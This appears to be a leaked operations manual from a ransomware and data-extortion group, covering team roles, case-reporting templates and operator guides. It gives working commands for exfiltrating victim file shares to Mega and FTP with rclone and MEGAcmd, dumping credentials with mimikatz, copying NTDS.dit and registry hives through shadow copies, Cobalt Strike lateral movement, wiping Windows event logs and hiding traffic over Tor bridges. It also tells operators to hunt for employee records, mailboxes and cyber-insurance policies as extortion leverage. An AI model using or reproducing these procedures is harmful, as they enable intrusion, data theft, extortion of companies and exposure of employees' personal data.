The structure is the following.
The current composition is divided into groups, each group is assigned a team leader (one or two, depending on the size of the group).
Ateam - team leader rozetka
Bteam - team leaders red and ali
Cteam - team leader steven

Team leaders are responsible for:
1. Issue cases for work
2. Teach, advise, instruct
3. Connect in the process of solving atypical or previously not completed tasks
4. Help with load builds, networking and other technical issues related to software
5. Provide the necessary guides and manuals

The working group is required to:
1. Listen
2. Watch
3. Do
4. Learn
5. Ask questions
6. Follow the guides and instructions, complete the assigned tasks

An example regulation is as follows.
- Got a session
- Removed primary information
- We created a channel in the rocket (everyone has this function), we call the channel the full main domain of the case (for example, google.com microsoft.com), add me + your group's team leaders there
- Uploaded primary information to the channel according to a given template (composition of adfind output domain, list of domain admins, enterprise admins, local admins, kerberos hashes, seatbelt output, sharefinder output, etc.)

We work from 15 to 01
from 19 to 20 we conduct a public analysis of problems in the discussion channel. Any technical questions are also there. For organizational questions - write in a personal.

First archive the files in zip
```
MegaNZ usage
1) Create folder for files
2) Uploads exe and dll files to created folder
3) Start background MEGAcmdServer.exe
4) Use the commands:
> MEGAclient.exe update --auto=off # disable autoupdate for megacmd
> MEGAclient.exe login login password # init session by creds
> MEGAclient.exe whoami # check connection
> MEGAclient.exe put -q --ignore-quota-warn test.txt # upload file to acc storage [-q background process]
> MEGAclient.exe ls # check remote directory
> MEGAclient.exe logout # end session
> MEGAclient.exe quit # kill MEGAcmdServer.exe
5) Remove special folder for MEGAcmd
6) Remove update task from schtasks:
> schtasks /query /FO list | findstr /i "mega"
> SCHTASKS /TN "\mega\ FULL NAME HERE" /DELETE /F


example:

> MEGAclient.exe update --auto=off
	Automatic updates disabled

> MEGAclient.exe login supertest@mail.test P@$$w0rd
	log in

> MEGAclient.exe whoami
	Account e-mail: supertest@mail.test, check our account

> MEGAclient.exe put -q --ignore-quota-warn C:\temp\test.txt
	upload test.txt

> MEGAclient.exe ls
	test.txt, check what files already uploaded

> MEGAclient.exe logout
	Logging out...

> MEGAclient.exe quit
	close megaclient

> schtasks /query /FO list | findstr /i "mega"

Regulations for submitting a case and working with data:

1. Upon completion of the lock, we issue information in the corresponding configuration in the following form

	https://domain.com
	100 Servers 1000 Workstations

	Mega:
	guerillamailaccount@sharklasers.com
	ComPl3xAndh3@vyP@s))91

	200 GB (here we indicate the amount of data in unzipped form, if this type is not clear, we mark COMPRESSED)

	COMPANY NAME creates elite transgender sex dolls for the US presidential administration.

2. After that, in the near future we set the data to merge from the mega and prepare the Data-pack in parallel

3. Data-pack is delivered as follows

	full-listing.txt - full listing of all files downloaded from mega
	30percentlisting.txt - 30% off full listing with focus on HR/Finance folders/database tables with private information
	datapack-example.zip - a small archive containing files from 30percentlisting.txt with priority on files containing confidential information, document scans, HR documents, closed company projects (the archive is small, weighing 10-30 megabytes)

4. Insurance. In the process of data retrieval and in the process of parsing, we are looking for files containing cyber insurance conditions, standard search tags

	Cyber
	policy
	insurance
	endorsement
	supplementary
	underwriting
	terms
	
	If such files with the content of insurance conditions are found, we MUST upload them separately to the channel upon completion of the case, they are an IMPORTANT subject of bargaining.

The presence of files on the network indicating the GDPR significantly increases the success of the payment, this is the standard that is adhered to in storing user data, the company will face significant fines for their leakage.
Please pay attention to this abbreviation in the process of work and in the process of uploading the listing of files and indicate this in the submission of the report.
	
5. What data should you pay special attention to?
	
	Databases containing information such as: email addresses / names / surnames / addresses / payment cards / DOB / SSN / Drivers License (all such DBMS must be exported and sample records from these DBMS are contained in the Data-pack).
	Files and databases relating to company employees (they almost always contain private information similar to the one described above)
	Content of mail servers (correspondence is a very strong pressure factor, uploading the contents of mailboxes of the control link is IMPORTANT if this is uploaded - it is worth mentioning separately with a listing of employees and their positions whose mail archives are uploaded)
	Contents of Accounting/Finance/HR/Projects/Confidential folders
	Sources of software, if it is developed in the company
	
6. 	Data from the mega must be downloaded entirely to a dedicated server

Message: Accessing a server with Shadow Protect SPX backups (StorageCraft)
```
==
1. We go via RDP to one of the servers, in my case it is a SQL server.
2. on the desktop we see the icon of the ShadowProtect SPX software
	-> click on it
3. gui opens (if it asks for credits, enter those under which you entered via RDP, or any other YES)
4. On the left in the "Job Summary" block, we see a detailed description of the backup scheme
	in the "Name" field - the name of the backup of our server
	in the "Destination" field - the place WHERE our spx stores the backups, in the form of SERVA_BA_NAME (SHARE WITH BACKUP ON THIS SERVER)
		From our example, we can conclude that all backups are stored in a ball called StorageCraft, and folders with server backups are named after the name of the server itself.
5. Knowing the name of the backup server, we want to get a better idea of its structure, first of all we get the balls with the command "cmd.exe> net view \\COH-DSS3 /ALL", in response we get "Error 5: Access Denied"
6. There is no access, we try to knock with other accounts YES - the answer is the same - error n 5, it would be logical to assume that in order to access the server we need either local admin credits on this very server, or a special user account with dedicated rights
7. Suppose that if this is a dedicated user, then it has a name similar to the software\function:
	iterate over logins with the occurrence of substrings (here we need to turn on fantasy):
		Storage
		Shadow
		Protect
		Craft
		SP
		SPX
		Backup
		BUUser
		ETC.
	then we do a search on ntds.dit (hashes.txt.ntds) to find the hash, in my case the search was successful and I found the user Humanity.local\SPAdmin (I think it’s clear that this is Shadow Protect Admin) and its hash ce31b806821bec116ba03132ab5b3138, BUT unfortunately the search on cmd5.org did not give any result, and I desperately need a clearpass. (If you have enough hash, then congratulations - you have reached the result)
8. But if you still need a clearpass or you could not find a suitable user, we will understand that if the software somehow knocks on the server, then the credits are known to it, which means they could remain on the server.
	Trying to dump hashes
	I won’t describe in detail here how to do it, but you should try hashdump (and its legitimate analogues) and logonpasswords (and analogues)
	In my case, I used a mimic and dumped lsass, in which I found a clearpass from my SPAdmin account - kerberos:
* Username : SPAdmin
* Domain : COHBackup
* Password : Backup!User
(in my case, for some reason, the domain was not Humanity.local but COHBackup, although you can also knock on Humanity.local (replace with your own value))
9. We go to the explorer, and open the necessary share "\\COH-DSS3\StorageCraft" through it, it asks me for credits, I enter COHBackup\SPAdmin and Backup!User and successfully get access
10. Also in some grids there may be several backup servers, as an option to check this, this is to click on the Backup button in the upper left corner of the gui (immediately after File) then - Destinations -> and we will see what are the ways to save backups
===
I'm not sure if this method will work for everyone, but in my case it worked, good luck!

Cleaning out the dens

1 Start a PowerShell console as an administrator and use the following command to list all classic event logs on your system, with their maximum sizes and the number of events in them.

Get-EventLog –LogName*

2 To clear all event logs, you would need to redirect the log names to the pipeline, however, unfortunately this is not allowed. Therefore, we will have to use the ForEach loop:

Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

3 For working with events in Windows, a powerful command-line utility WevtUtil.exe has been available for quite some time.

To display a list of event logs registered in the system, run the command:

WevtUtil enum-logs

Clearing events in a specific log is done like this:

WevtUtil cl Setup

Before cleaning, you can back up the events in the log by saving them to a file:

WevtUtil cl Setup /bu:SetupLog_Bak.evtx

To clear all logs at once, you can use the Powershell Get-WinEvent cmdlet to get all log objects and Wevtutil.exe to clear them:

Get-WinEvent -ListLog * -Force | % { Wevtutil.exe cl $_.LogName }

or so

Wevtutil el | ForEach { wevtutil cl "$_"}


4 Clearing logs can also be done from the classic command line:

for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"

Batch file for cleaning logs

PHP:
 
break>"%CD%\server_log.txt"

break>"%CD%\logs\errors.log"
break>"%CD%\logs\log-core.log"
break>"%CD%\logs\warnings.log"
break>"%CD%\logs\plugins\mysql.log"


Clear all Windows Event Viewer logs
1.CMD
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"

2. PowerShell

Message: guys, a very useful thing, in fact you have 2 axes on 1 dedik, it’s convenient for working from under a vpn
linux terminal in windows, need 2019 server
```
===
we need windows server 2019+
1. run poower shell as administrator and type:
	> Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux

2. Download linux subsystem distro from: https://docs.microsoft.com/en-us/windows/wsl/install-manual
like:
	kali: https://aka.ms/wsl-kali-linux-new
	ubuntu18.04: https://aka.ms/wsl-ubuntu-1804
	ubuntu20.04: https://aka.ms/wslubuntu2004
	debian: https://aka.ms/wsl-debian-gnulinux

3. Open poowershell and extract files from appx like:(Ubuntu -> changed_name)
copy .appx downloaded file to C:\Users\Administrator and go to the this folder in pwsh

	> Rename-Item .\Ubuntu.appx .\Ubuntu.zip
> Expand-Archive .\Ubuntu.zip .\Ubuntu
> cd kali

4. Run Ubuntu.exe

5. Add your distro path to the Windows environment PATH (C:\Users\Administrator\Ubuntu in this example), using PowerShell:

$userenv = [System.Environment]::GetEnvironmentVariable("Path", "User")
[System.Environment]::SetEnvironmentVariable("PATH", $userenv + ";C:\Users\Administrator\Ubuntu", "User")

!1/ if you dont have exe in your folder, check this steps with another distro
!2/ Installation failed with error 0x8007007e: If you receive this error, then your system doesn't support WSL. Ensure that you're running Windows build 16215 or later. Check your build. Also check to confirm that WSL is enabled and your computer was restarted after the feature was enabled.

shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin list shadows >> c:\log.txt"


we make a request for a listing of shadow copies, there is an indication of the date, check that there is a fresh date
almost certainly they are already there, if not, we do it ourselves

net start Volume Shadow Copy
shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"


further in the listing of shadow copies we find the latest
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
accordingly we need a copy number for the next command


shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\ temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c :\temp\log\"


in c:\temp\log\ files ntds.dit / security / system should fall
we take a portable console 7z and pack it into an archive with a password
Code: [Highlight]

7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD


we download the password-protected archive to ourselves, if we get an error when decrypting the ntds file (the file is damaged), then we do the following


Esentutl /p C:\log\ntds.dit


the trick of this method is that we don’t actually dump anything, we just take and pump out ntds
in order not to get burned by the fact that we are pulling out exactly ntds, we pack it into a password-protected archive

if you have troubles with what they fire and throw out of the network after the ntds dump - try this method
it can be burned only by the very fact of some leaking date from the CD, and it is impossible to analyze what exactly you are dragging without knowing the password from the archive

1) After we raised the rights, found the Admin Domain, we pull the sessions into cobalt
2) We put on the YES token and remove the balls in this way:
*powershell-import - upload ShareFinder there as usual and give the following command -
psinject 7080 x64 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\found_shares.txt

Next, we study the removed balls, we are interested in
*Finance docks
*Accounting
*Aichi
*Clients
*Projects
And so on, it all depends on what our target is doing

Then we do the following > here is the Manual from Diablo, everything is lego accessible and understandable

Rklon
in order to start downloading via rklon you need to create a config
to create a config, you need to open cmd go to the directory where rclone.exe is located
run rclone.exe with command: rclone config
then select new remote in the menu that appears
call it mega then enter mega again
after that we enter the mega mail address after he asks his pass to enter or generate we choose our letter 'Y'
the pass will not appear when inserted, but it is inserted there anyway
after creating the config, we are thrown into the main menu and we exit the clone.
then we enter this command rclone.exe config show it will show the config itself that we created
we copy it and create the rclone.conf file where we put this info.
after we found the balls we are interested in, we upload the exe and the config to the target machine with rights, we hide the config and the exe so that they would not be found
go to the directory of the executable and give the command: shell rclone.exe copy "\\envisionpharma.com\IT\KLSHARE" Mega:Finanse -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
where: \\envisionpharma.com\IT\KLSHARE is the balls
Mega:Finanse location of files in mega (it can create a folder in mega by itself, you just need to specify it here)
streams 12 --transfers 12 is the number of streams that download to the maximum (12) I do not recommend because you can easily get burned



shell rclone.exe copy "\\PETERLENOVO.wist.local\Users" ftp1:uploads/Users/ -q --ignore-existing --auto-confirm --multi-thread-streams 3 --transfers 3 - here is an example in in this case on FTP

Message: ```INITIAL ACTIONS

1) Removing AD - allows us to find out how many servers and workstations are in the network, as well as information about users, who has what position, etc., after removing hell, we do sorted to sort only what we need - we will show this to you later
2) Removing the ball (sharfinder) - with the help of it, we look where we have access with this user (to other PCs)
3) Kerberos attack - pulls hashes out of memory, with successful removal and successful dehashing - DomainAdmin is provided to us
4) If we have system rights, using the "hashdump" and "logonpasswords" commands, we can pull off the hashes and mimikadz and we will already have the domain user flogged, and sometimes the admin domain
5) If we found the login and hash of the admin domain and at the same time we could not hash the hash, we do the following command pth Domain\Admin pass (in the form of a hash), using the command shell dir \\ip or hostname\c$ we will check access to a server or workstation
6) If we found the login \ pass domain of the admin or user, we can put on his token, the command looks like this make_token Domain \ Admin Pass , if you want to remove the token, the rev2self command
7) If there is a system process on the session, using the getsystem command, you can raise the system rights on the session, point (4)
8) Also, do not forget to look at the processes using the ps command, you can find the user there, migrate to his process> Explore> Process list> then select the user process (the user must be different, not the one in the session) and press inject, select SSL listener
9) After migrating to a new user, you also need to remove the balls to see where you can break through with him
10) When you remove the shares, then at the end of the removal to the C:\ProgramData directory and there is sh.txt or shares.txt , download, see how many "remote admin" are in the textbook, if there are more than one, then this means that access is on another computer
11) Click on the session > File Browser > write the path \\ip or hostname of the computer to which you have access\c$ , put the peloid there, I'll give it out later
12) Launching a peloid depends on its format exe or dll, after launching I will personally explain later
13) Ping servers and workstations like this, we need p.bat, I will throw it into the group. We create a txt, call it domains.txt, add the hostnames of servers or workers there. Hostnames are taken from the removed AD, with the help of a script, we will show them how to use
14) If you find some kind of password, you can also run it through smb_login - this is a tool in metasploit, I will issue a metasploit and tell you how to use it. smb_login will show to which servers or workers, there is access with these credits

1. Copy the "PluggableTransports" directory and the "torrc" file.
```
cmd cd C:\Users\Admin\Desktop\
cmd copy Tor Browser\Browser\TorBrowser\Tor\PluggableTransports TorExpertBundle\Tor\PluggableTransports
cmd copy Tor Browser\Browser\TorBrowser\Data\Tor\torrc TorExpertBundle\Tor\torrc
```
2. We change the contents of the "torrc" file, substituting our directories and new bridges.
```
Bridge obfs4 155.133.16.199:9003 1777CED1816756F493A909A71698B74A7035D422 cert=fUrO/thUgzUoEZvpd3XTSmodexQhk2nTAdFDtKcDFlatbJtxd6aBMc8+ifPdxNSxlAjtdiak=

GeoIPv6File C:\Users\Admin\Desktop\TorExpertBundle\geoip6

## obfs4proxy configuration
ClientTransportPlugin obfs4 exec C:\Users\Admin\Desktop\TorExpertBundle\Tor\PluggableTransports\obfs4proxy
```

3. And then run:
```
cmd tor.exe -f "C:\Users\Admin\Desktop\TorExpertBundle\Tor\torrc"
